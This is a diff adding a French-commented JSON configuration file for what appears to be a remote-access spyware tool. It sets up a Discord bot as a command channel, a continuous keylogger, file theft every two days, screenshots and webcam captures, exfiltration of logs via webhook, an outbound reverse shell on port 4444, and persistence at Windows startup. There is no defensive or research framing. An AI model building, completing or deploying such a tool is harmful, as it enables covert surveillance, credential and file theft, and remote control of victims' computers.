@@ -1,0 +1,28 @@
+{
+  "_a_transport": "SALONS : <machine> pour les commandes et <machine>-keylogs pour le journal du clavier en continu. TRANSPORT : si webhook_url est renseigné, textes et fichiers y partent (chemin classique). Sinon c'est le BOT qui publie. channel_id = salon de repli, guild_id = serveur dans lequel un salon est créé au nom de la machine (un salon par poste). Laisser webhook_url vide pour utiliser le bot.",
+
+  "enabled": true,
+  "webhook_url": "",
+
+  "_b_c2": "JETON DU BOT et ID du serveur (guild_id) : les commandes ! tapées dans le salon de la machine sont exécutées ici. channel_id = ID du salon de repli (clic droit → Copier l'identifiant). RENSEIGNE-LES ICI OU PASSE PAR cmd/builder (-bot-token -guild -channel). Ne commitez jamais un payload.json rempli : il est gitignoré.",
+  "bot_token": "",
+  "channel_id": "",
+  "guild_id": "",
+
+  "_c_shell": "Reverse shell TCP sortant. Mets shell_enable à true, l'IP et un port ouvert (ex. 4444), puis connecte-toi depuis n'importe quel client TCP (cmd ou ps).",
+  "shell_enable": false,
+  "shell_host": "",
+  "shell_port": 4444,
+
+  "_d_cadences": "Cadences, en minutes. 0 désactive la tâche. Le stream vers <machine>-keylogs part toutes les 5 s (indépendant de keylog = flush disque) ; steal 2880 = vol de fichiers tous les 2 jours, aucun rapport système automatique au démarrage ; screenshots 10 = un fichier par écran ; webcam 10 = une photo vers <machine>-webcam ; exfil 10 = envoi des journaux.",
+  "interval_steal_min": 2880,
+  "interval_keylog_min": 1,
+  "interval_screenshot_min": 10,
+  "interval_webcam_min": 10,
+  "interval_exfil_min": 10,
+
+  "_e_divers": "persist = ajout au démarrage de Windows. max_log_kb = taille max d'un journal local. debug = miroir des messages dans diagnostic.txt avec -diag.",
+  "persist": true,
+  "max_log_kb": 512,
+  "debug": false
+}
